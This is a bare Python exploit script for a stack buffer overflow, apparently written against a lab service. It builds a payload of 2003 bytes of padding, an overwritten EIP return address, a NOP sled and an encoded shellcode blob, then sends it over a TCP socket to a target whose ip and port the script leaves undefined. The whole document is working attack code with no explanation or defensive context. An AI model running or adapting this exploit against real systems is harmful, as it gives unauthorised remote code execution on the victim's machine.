
import sys, socket

offset = 2003

junk = ("A" * offset)

EIP = "\xAF\x11\x50\x62"

nops = ("\x90" * 32)


shellcode=("\xd9\xcc\xb8\x38\x1b\x24\x10\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"

"\x52\x31\x43\x17\x03\x43\x17\x83\xd3\xe7\xc6\xe5\xdf\xf0\x85"

"\x06\x1f\x01\xea\x8f\xfa\x30\x2a\xeb\x8f\x63\x9a\x7f\xdd\x8f"

"\x51\x2d\xf5\x04\x17\xfa\xfa\xad\x92\xdc\x35\x2d\x8e\x1d\x54"

"\xad\xcd\x71\xb6\x8c\x1d\x84\xb7\xc9\x40\x65\xe5\x82\x0f\xd8"

"\x19\xa6\x5a\xe1\x92\xf4\x4b\x61\x47\x4c\x6d\x40\xd6\xc6\x34"

"\x42\xd9\x0b\x4d\xcb\xc1\x48\x68\x85\x7a\xba\x06\x14\xaa\xf2"

"\xe7\xbb\x93\x3a\x1a\xc5\xd4\xfd\xc5\xb0\x2c\xfe\x78\xc3\xeb"

"\x7c\xa7\x46\xef\x27\x2c\xf0\xcb\xd6\xe1\x67\x98\xd5\x4e\xe3"

"\xc6\xf9\x51\x20\x7d\x05\xd9\xc7\x51\x8f\x99\xe3\x75\xcb\x7a"

"\x8d\x2c\xb1\x2d\xb2\x2e\x1a\x91\x16\x25\xb7\xc6\x2a\x64\xd0"

"\x2b\x07\x96\x20\x24\x10\xe5\x12\xeb\x8a\x61\x1f\x64\x15\x76"

"\x60\x5f\xe1\xe8\x9f\x60\x12\x21\x64\x34\x42\x59\x4d\x35\x09"

"\x99\x72\xe0\x9e\xc9\xdc\x5b\x5f\xb9\x9c\x0b\x37\xd3\x12\x73"

"\x53\x97\xaa\x6e\x4c\xfe\x65\x07\xf5\x5b\xfd\xb6\xfa\x71\x78"

"\xf8\x71\x76\x7d\xb7\x71\xf3\x6d\x20\x72\x4e\xcf\xe7\x8d\x64"

"\x67\x6b\x1f\xe3\x77\xe2\x3c\xbc\x20\xa3\xf3\xb5\xa4\x59\xad"

"\x6f\xda\xa3\x2b\x57\x5e\x78\x88\x56\x5f\x0d\xb4\x7c\x4f\xcb"

"\xb9\xf9\x83\x51\xc6\xd7\x75\xbd\x77\x8e\xc3\xc2\xb8\x46\xc4"

"\xbb\xa4\xf6\x2b\x16\x6d\x06\x66\x3a\xc4\x8f\x2f\xaf\x54\xd2"

"\xcf\x1a\x9a\xeb\x53\xae\x63\x08\x4b\xdb\x66\x54\xcb\x30\x1b"

"\xc5\xbe\x36\x88\xe6\xea")


buff = junk + EIP + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip, port))

s.recv(1024)

s.send(buff)
